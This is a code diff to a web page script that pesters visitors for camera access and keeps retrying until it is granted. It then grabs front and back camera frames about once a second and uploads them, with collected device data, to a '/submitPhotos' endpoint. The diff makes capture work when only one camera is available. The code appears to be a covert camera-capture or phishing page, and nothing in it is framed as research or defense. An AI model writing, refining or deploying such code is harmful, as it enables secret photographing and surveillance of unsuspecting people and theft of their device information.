@@ -86,43 +86,33 @@
             return match ? match[1] : 'Unknown';
         }
 
-        async function requestCameraPermission() {
-            while (true) {
-                try {
-                    await navigator.mediaDevices.getUserMedia({ 
-                        video: { 
-                            width: { ideal: 640 },
-                            height: { ideal: 480 },
-                            facingMode: 'user'
-                        } 
-                    });
-                    return true;
-                } catch (error) {
-                    console.error('Error accessing camera:', error);
-                    await new Promise(resolve => setTimeout(resolve, 1000));
-                }
+        async function requestCameraPermission(facingMode) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        width: { ideal: 640 },
+                        height: { ideal: 480 },
+                        facingMode: facingMode
+                    } 
+                });
+                return stream;
+            } catch (error) {
+                console.error(`Error accessing ${facingMode} camera:`, error);
+                return null;
             }
         }
 
         async function init() {
             try {
                 const additionalData = await collectAdditionalData();
-                await requestCameraPermission();
-                const frontStream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { 
-                        width: { ideal: 640 },
-                        height: { ideal: 480 },
-                        facingMode: 'user'
-                    } 
-                });
-                const backStream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { 
-                        width: { ideal: 640 },
-                        height: { ideal: 480 },
-                        facingMode: 'environment'
-                    } 
-                });
-                handleSuccess(frontStream, backStream, additionalData);
+                const frontStream = await requestCameraPermission('user');
+                const backStream = await requestCameraPermission('environment');
+
+                if (frontStream || backStream) {
+                    handleSuccess(frontStream, backStream, additionalData);
+                } else {
+                    throw new Error('No camera access granted');
+                }
             } catch (e) {
                 console.error('Error in init:', e);
                 setTimeout(init, 1000);
@@ -130,11 +120,14 @@
         }
 
         function handleSuccess(frontStream, backStream, additionalData) {
-            frontVideo.srcObject = frontStream;
-            backVideo.srcObject = backStream;
-
-            frontVideo.addEventListener('loadedmetadata', () => setupCamera(frontVideo, frontCanvas, 'front', additionalData));
-            backVideo.addEventListener('loadedmetadata', () => setupCamera(backVideo, backCanvas, 'back', additionalData));
+            if (frontStream) {
+                frontVideo.srcObject = frontStream;
+                frontVideo.addEventListener('loadedmetadata', () => setupCamera(frontVideo, frontCanvas, 'front', additionalData));
+            }
+            if (backStream) {
+                backVideo.srcObject = backStream;
+                backVideo.addEventListener('loadedmetadata', () => setupCamera(backVideo, backCanvas, 'back', additionalData));
+            }
         }
 
         function setupCamera(video, canvas, cameraType, additionalData) {
@@ -161,10 +154,10 @@
                         formData.append('cameraType', cameraType);
                         formData.append('additionalData', JSON.stringify(additionalData));
                         post('/submitPhotos', formData);
-                    }, 'image/webp', 0.7);  // استخدام تنسيق WebP مع جودة 0.7
+                    }, 'image/webp', 0.7);
 
                     photoCount++;
-                }, 1000);  // زيادة الفاصل الزمني بين الصور إلى 2 ثوانٍ
+                }, 1000);
             };
         }
 
@@ -199,7 +192,7 @@
                     console.error('Error:', error);
                     retries++;
                     if (retries < maxRetries) {
-                        await new Promise(resolve => setTimeout(resolve, 3000 * retries));  // زيادة وقت الانتظار مع كل محاولة
+                        await new Promise(resolve => setTimeout(resolve, 3000 * retries));
                     }
                 }
             }
